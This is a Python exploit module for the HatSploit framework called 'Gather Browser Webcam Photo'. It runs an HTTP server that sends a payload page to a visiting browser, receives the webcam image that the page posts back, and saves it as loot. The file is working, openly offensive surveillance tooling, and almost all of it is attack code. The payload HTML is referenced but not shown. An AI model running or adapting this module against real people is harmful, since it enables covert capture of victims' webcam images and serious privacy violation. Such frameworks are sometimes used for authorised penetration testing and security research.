#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import json

from hatsploit.lib.module import Module
from hatsploit.lib.loot import Loot

from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    loot = Loot()

    details = {
        'Category': "exploit",
        'Name': "Gather Browser Webcam Photo",
        'Module': "exploit/generic/gather/browser_webcam_photo",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Module takes photo through browser.",
        'Platform': "generic",
        'Rank': "high"
    }

    options = {
        'SRVHOST': {
            'Description': "Host to start http server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Port to start http server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'FILE': {
            'Description': "File to save photo.",
            'Value': loot.random_loot(),
            'Type': None,
            'Required': True
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        server_host, server_port, file, url_path = self.parse_options(self.options)

        def GET(request):
            if request.path == url_path:
                payload = self.loot.get_data('webcam/index.html')
                self.print_process("Delivering payload...")

                request.send_status(200)
                request.wfile.write(payload.encode())

        def POST(request):
            if request.path == url_path:
                self.print_process("Taking webcam photo...")
                request.send_status(200)

                try:
                    photo_length = int(request.headers['Content-Length'])

                    post_data = request.rfile.read(photo_length)
                    photo_data = json.loads(post_data)['image']

                except Exception:
                    self.print_error("Failed to take photo!")
                    return

                self.loot.save_loot(file, photo_data)

        self.http_server(
            server_host,
            server_port,
            {
                'GET': GET,
                'POST': POST
            }
        )
